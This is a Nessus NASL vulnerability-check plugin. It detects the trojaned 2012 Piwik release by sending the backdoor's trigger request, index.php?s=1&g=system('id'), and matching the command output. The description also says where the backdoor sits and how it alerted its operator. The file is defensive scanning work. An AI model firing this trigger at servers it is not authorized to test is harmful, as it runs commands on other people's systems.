#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(63079);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2015/11/13 19:55:45 $");

  script_bugtraq_id(56716);
  script_osvdb_id(87889);

  script_name(english:"Piwik core/Loader.php Trojaned Distribution");
  script_summary(english:"Attempts to execute a command.");

  script_set_attribute(attribute:"synopsis", value:
"A web application hosted on the remote web server contains a backdoor.");
  script_set_attribute(attribute:"description", value:
"The version of Piwik installed on the remote web server contains a
trojaned backdoor, and allows the execution of arbitrary PHP code
subject  to the privileges under which the web server operates.

It is likely to have been installed from a copy of the file
'latest.zip' downloaded from the project's website between 15:43 UTC
and 23:59 UTC on 11/26/2012. The file was modified to include
backdoored code at the end of the application's 'core/Loader.php'
script, to make available a shell command launcher as
'core/DataTable/Filter/Megre.php', and to notify an attacker through
a web form hosted on prostoivse.com. 

Note that Nessus has only verified code execution through the
backdoored code.");
  script_set_attribute(attribute:"see_also", value:"http://forum.piwik.org/read.php?2,97666");
  # http://piwik.org/blog/2012/11/security-report-piwik-org-webserver-hacked-for-a-few-hours-on-2012-nov-26th/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?4b159741");
  script_set_attribute(attribute:"solution", value:
"Refer to the project's blog post for steps from the vendor on cleaning
an affected installation. Additionally, conduct a full security review
of the host, as it may have been compromised.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/11/26");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/11/27");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/11/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:piwik:piwik");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("piwik_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Piwik", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

appname = "Piwik";

get_install_count(app_name:appname, exit_if_zero:TRUE);
port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : appname,
  port : port
);

dir = install["path"];
loc =  build_url(port:port, qs:dir);
vuln = FALSE;

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';
  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask";

foreach cmd (cmds)
{
  attack = dir + "/index.php?s=1&g=system('" + urlencode(str:cmd) + "')";
  res = http_send_recv3(
    method       : "GET",
    item         : attack,
    port         : port,
    exit_on_fail : TRUE
  );

  if (egrep(pattern:cmd_pats[cmd], string:res[2]))
  {
    vuln = TRUE;
    break;
  }
}

if (!vuln) audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, loc);
if (cmd == "ipconfig /all") line_limit = 10;
else line_limit = 5;
security_report_v4(
  port : port,
  severity : SECURITY_HOLE,
  cmd : cmd,
  line_limit : line_limit,
  request :  make_list(build_url(qs:attack, port:port)),
  output : chomp(res[2])
);
exit(0);
